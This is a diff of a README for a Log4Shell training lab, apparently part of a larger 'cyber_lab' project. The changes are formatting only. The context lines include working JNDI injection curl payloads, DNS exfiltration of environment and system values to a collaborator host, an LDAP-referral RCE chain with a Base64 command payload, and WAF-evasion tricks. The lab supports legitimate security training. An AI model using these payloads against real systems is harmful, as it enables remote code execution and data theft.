@@ -1,7 +1,8 @@
 # Log4Shell (CVE-2021-44228) JNDI Injection & RCE Lab
 
 ## Overview
-**Log4Shell (CVE-2021-44228)** is a critical Remote Code Execution (RCE) vulnerability in Apache Log4j 2 (versions 2.0-beta9 to 2.14.1). 
+
+**Log4Shell (CVE-2021-44228)** is a critical Remote Code Execution (RCE) vulnerability in Apache Log4j 2 (versions 2.0-beta9 to 2.14.1).
 
 Apache Log4j supports message lookup substitution syntax `${prefix:name}` (such as `${java:version}`, `${env:USER}`). When Log4j encounters the JNDI prefix (`${jndi:...}`), it leverages the Java Naming and Directory Interface to query an external directory service (LDAP, RMI, DNS, or LDAPS). If an attacker supplies an untrusted payload that gets logged, Log4j reaches out to the attacker's LDAP server and executes arbitrary Java bytecode loaded from the remote codebase.
 
@@ -28,6 +29,7 @@ This lab provides an isolated Spring Boot target application incorporating vulne
 ## Step-by-Step Exploit Exercises
 
 ### Exercise 1: Starting the Lab & Baseline Verification
+
 1. Start the vulnerable Log4Shell application:
    ```bash
    ./lab start log4shell
@@ -45,6 +47,7 @@ This lab provides an isolated Spring Boot target application incorporating vulne
 ---
 
 ### Exercise 2: Out-of-Band (OOB) Detection via JNDI Injection
+
 1. Use an Out-of-Band interaction tool such as the local Interactsh collaborator server (`./lab start oob`) or public interactsh:
    ```bash
    # If running interactsh client or local listener on port 8090/5354:
@@ -60,7 +63,9 @@ This lab provides an isolated Spring Boot target application incorporating vulne
 ---
 
 ### Exercise 3: Environment Variable & System Data Exfiltration
+
 Log4j can recursively resolve lookups. By nesting `${env:...}` or `${sys:...}` lookups inside the JNDI hostname, sensitive data is leaked via DNS:
+
 1. Leak the Java runtime version:
    ```bash
    curl http://localhost:8104/ -H "X-Api-Version: \${jndi:ldap://\${sys:java.version}.$COLLAB/a}"
@@ -74,7 +79,9 @@ Log4j can recursively resolve lookups. By nesting `${env:...}` or `${sys:...}` l
 ---
 
 ### Exercise 4: Full Remote Code Execution (RCE) Chain
+
 To achieve full RCE on the vulnerable target:
+
 1. Start an LDAP referral server using **JNDIExploit** or **marshalsec**:
    ```bash
    # Run JNDIExploit listener on your host (example on port 1389):
@@ -84,7 +91,7 @@ To achieve full RCE on the vulnerable target:
    ```bash
    curl http://localhost:8104/ -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZA==}'
    ```
-   *(The Base64 payload decodes to `touch /tmp/pwned`)*
+   _(The Base64 payload decodes to `touch /tmp/pwned`)_
 3. Verify remote execution inside the target container:
    ```bash
    docker exec cyberlab_web_log4shell ls -la /tmp/pwned
@@ -94,6 +101,7 @@ To achieve full RCE on the vulnerable target:
 ---
 
 ### Exercise 5: WAF Evasion & Filter Bypass Techniques
+
 Web Application Firewalls often block literal strings like `jndi:ldap` or `jndi:rmi`. Because Log4j recursively evaluates lookup expressions, you can bypass naive regex filters using variable manipulation:
 
 1. **Case Conversion Lookups**:
@@ -130,7 +138,9 @@ Web Application Firewalls often block literal strings like `jndi:ldap` or `jndi:
 ---
 
 ## Quick CLI Control
+
 From the `cyber_lab` root directory:
+
 ```bash
 # Start Log4Shell vulnerable app
 ./lab start log4shell
